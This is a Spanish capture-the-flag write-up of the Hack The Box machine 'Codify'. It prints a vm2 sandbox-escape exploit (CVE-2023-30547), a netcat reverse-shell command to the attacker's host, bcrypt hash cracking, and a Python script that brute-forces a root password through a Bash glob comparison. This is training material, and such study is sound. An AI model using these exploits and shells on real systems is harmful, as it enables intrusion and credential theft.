---
tags: 
- Linux
- SQLite3
- Vm2
- NodeJs
- JavaScript
title: Codify - Easy (HTB)
permalink: /Codify-HTB-Writeup
toc: true
toc_sticky: true
sidebar: main
toc_label: Topics
---
---
# Introduccion

`Codify` es una máquina `Linux` fácil que cuenta con una aplicación web que permite a los usuarios probar el código `Node.js`. La aplicación utiliza una biblioteca vulnerable `vm2`, que se aprovecha para obtener la ejecución remota de código. Enumerar el objetivo revela una base de datos `SQLite` que contiene un hash que, una vez agrietado, produce acceso `SSH` a la caja. Finalmente, un script `Bash` vulnerable se puede ejecutar con privilegios elevados para revelar la contraseña `root` , lo que lleva a un acceso privilegiado a la máquina.

# Reconocimiento

```bash
nmap -sCV -p22,80,3000 10.129.251.249                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 02:34 -03
Nmap scan report for 10.129.251.249
Host is up (0.67s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.16 seconds
```

## codify.htb / Port 80

Al parece la pagina presenta un editor de código `JavaScript` para el testeo de código de `NodeJS`.

![image-center](/assets/images/{7A2F6464-0AAF-483C-B962-5B4ED6AE19D7}.png)

### Limitations and Whitelist 

Si me voy al mensaje que dice `limitations` veo el siguiente mensaje el cual indica que módulos si están permitidos para el uso en el editor, y además los que no están permitidos como `child_process` y `fs`.

![image-center](/assets/images/{F2511ABF-9D5F-4461-8549-25EFD82AC1F6}.png)

## Shell as svc
### About

En la seccion de about me relata el uso de la libreria `vm2`.

![image-center](/assets/images/{D95054A9-DD2A-4046-A534-F4A82EA9F89A}.png)
### Editor JavaScript

![image-center](/assets/images/{65D31DDB-0D1E-41CA-B59B-E22E988A67B1}.png)

## [CVE-2023-30547](https://nvd.nist.gov/vuln/detail/CVE-2023-30547)

Como se que emplea la librería puedo buscar por `vm2 library sandbox escape` y luego de varios enlaces me crucé con este [post](https://thehackernews.com/2023/04/critical-flaws-in-vm2-javascript.html) donde relata la capacidad de un atacante de obtener` Ejecucion remota de comandos (RCE)` escapando del `sandbox` de `vm2`.
En el mismo post me provee un enlace donde muestra una porción de código de prueba el cual es el siguiente:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

Lo voy a modificar ligeramente haciendo que en vez de crear un archivo ejecute un simple `whoami`. Donde la linea modificada quedaría de la siguiente forma.

```js
c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
```

Después de colocar el código completo en la pagina vemos que en el output, al parecer se ejecuta como el usuario `svc`

![image-center](/assets/images/{508BC3FD-F3B2-402A-8038-FBFFAF550592}.png)

Ahora solo me queda modificar el código para poder enviarme una shell a mi maquina, donde quedaría algo así.

```js
c.constructor('return process')().mainModule.require('child_process').execSync('busybox nc 10.10.17.19 4444 -e /bin/sh');
```

Y desde mi listener `nc` en donde recibo la shell .

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.251.249] 58986
whoami
svc
```
## Shell as joshua

Viendo el contenido del `/etc/passwd` veo que además del usuario `svc` esta `joshua`.

```bash
svc@codify:/var/www/contact$ cat /etc/passwd| grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash

```
### DB file

Veo que en el directorio `/var/www/contact` hay un archivo `Sqlite3` el cual podria tener datos o password sobre otros usuarios.

```bash
svc@codify:/var/www/contact$ ls
index.js  package.json  package-lock.json  templates  tickets.db
```

Para poder dumpear los datos y no tener que conectarme a la base de datos, puedo usar el mismo `sqlite3` con el comando `.dump` para extraer/dumpear toda la informacion del archivo.

```bash
svc@codify:/var/www/contact$ sqlite3 tickets.db  .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    );
INSERT INTO users VALUES(3,'joshua','$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2');
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT);
INSERT INTO tickets VALUES(1,'Tom Hanks','Need networking modules','I think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!','open');
INSERT INTO tickets VALUES(2,'Joe Williams','Local setup?','I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.','open');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',3);
INSERT INTO sqlite_sequence VALUES('tickets',5);
COMMIT;
```

### Cracking password

Como veo que dentro del contenido del archivo hay un hash en formato **`bcrypt`** para el usuario `joshua`, meto el mismo dentro de un archivo y realizo un ataque de fuerza bruta para romper el mismo.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt     

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:00:22 DONE (2025-11-21 03:12) 0.04460g/s 61.01p/s 61.01c/s 61.01C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ahora que tengo la password de `joshua` puedo conectarme al protocolo `ssh` con sus credenciales.

```bash'
ssh joshua@codify.htb
joshua@codify.htb''s password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

[..snip..]

Last login: Wed Mar 27 13:01:24 2024 from 10.10.14.23
joshua@codify:~$
```

```bash
joshua@codify:~$ cat user.txt 
b2c3ce755e8f29a20a07b2e564c85d33
```

## Shell as root 

### Enumeration

```bash
joshua@codify:~$ sudo -l 
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

### Wildcard abuse

Este codigo tiene una vulnerabilidad en como almacena la password de `root` en la variable .Cuando usas `==` dentro de `[[ ]]` en Bash, el lado derecho se trata como un **patrón glob/wildcard**, NO como una string literal.

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

### Bypassing validation

De forma que puedo jugar con `wildcards` para hacer que la password real se compare con `*` de esta manera el script evalúa la contraseña de la siguiente forma: 

```bash
if [[ $DB_PASS == * ]]; then
```

Haciendo que la condición siempre sea verdadera ya que lo compara con todos los caracteres. De esta forma puedo ir probando a ver cual es la respuesta y si es que logro `bypassear` el script y su validación colocando un `*` como password de `MySQL`.

```bash
joshua@codify:/tmp$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

Parecido a las inyecciones `LDAP` puedo ir jugando de manera que puedo hacer un `a*` haciendo que la validacion compare la pass real con una pass la cual empieza por el caracter `a`.

```bash
joshua@codify:/tmp$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmation failed!
```

Probando eso veo que sale un mensaje de error, asi que despues de una pruebas manuales descubri que el primer caracter de la password es `k`. Ya que colocando el siguiente payload `k*` me devuelve lo siguiente:

```bash
joshua@codify:/tmp$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: 
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```
### Script

Ahora para ahorrame todo el proceso manual me cree un script en `python` que me automatiza todo el proceso.

```python
#!/usr/bin/env python3
import subprocess
import string

SCRIPT_PATH = "sudo /opt/scripts/mysql-backup.sh"

def test_pattern(pattern):
    """Prueba un patrón contra el script"""
    try:
        proc = subprocess.Popen(
            SCRIPT_PATH,
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, _ = proc.communicate(input=pattern + '\n', timeout=5)
        return "Password confirmed!" in stdout
    except:
        return False
    
def extract_password():
    charset = string.ascii_letters + string.digits + string.punctuation
    password = ""
    print("[*] Starting password extraction...")
    print(f"[*] Testing Charset : {charset[:20]}...")
    
    while True:
        found = False
        
        for char in charset:
            if char in ['*', '?', '[', ']', '\\', '$', '`', '"', "'", '!']:
                test_char = '\\' + char
            else:
                test_char = char
            
            pattern = password + test_char + '*'
            print(f"\r[*] Testing pattern: {password + char}*", end='', flush=True)
            
            if test_pattern(pattern):
                password += char
                print(f"\n --> Found character: {char}")
                print(f" --> Current password: {password}")
                found = True
                break
        
        if not found:
            print("\n[*] Password extraction complete.")
            print(f"[*] Root password: {password}")
            break
    
    return password
        
if __name__ == "__main__":
    print("Bash Wildcard Extractor")
    if test_pattern('*'):
        print("[*] Wildcards bypass confirmed! Proceeding with extraction.")
        extracted = extract_password()
    else:
        print("[*] Wildcards are not supported. Exiting.")
        exit(1)
```

Ahora me basta con darle permisos de ejecución y correrlo para así descubrir la `password` de `root`
```python
joshua@codify:/tmp$ ./wildard.py 

╔═══════════════════════════════════════╗
║  Bash Wildcard Password Extractor    ║
╚═══════════════════════════════════════╝
    
[*] Testing wildcard bypass...
[+] Wildcard bypass confirmed!

[*] Starting password extraction...
[*] Testing charset: abcdefghijklmnopqrst...
[*] Testing: k*
[+] Found character: k
[+] Current password: k
[*] Testing: kl*
[+] Found character: l
[+] Current password: kl
[..snip..]
[+] Found character: 3
[+] Current password: kljh12k3jhaskjh12kjh3
```

Y así descubro la pass de `root` : `kljh12k3jhaskjh12kjh3`, con la que puedo cambiar de usuario a el desde la misma shell de `joshua`.

```bash
joshua@codify:/tmp$ su root
Password: 
root@codify:/tmp# cat /root/root.txt 
6c365d66f10683e9afa80762f91ef88a
root@codify:/tmp# 
```

`~Happy Hacking.`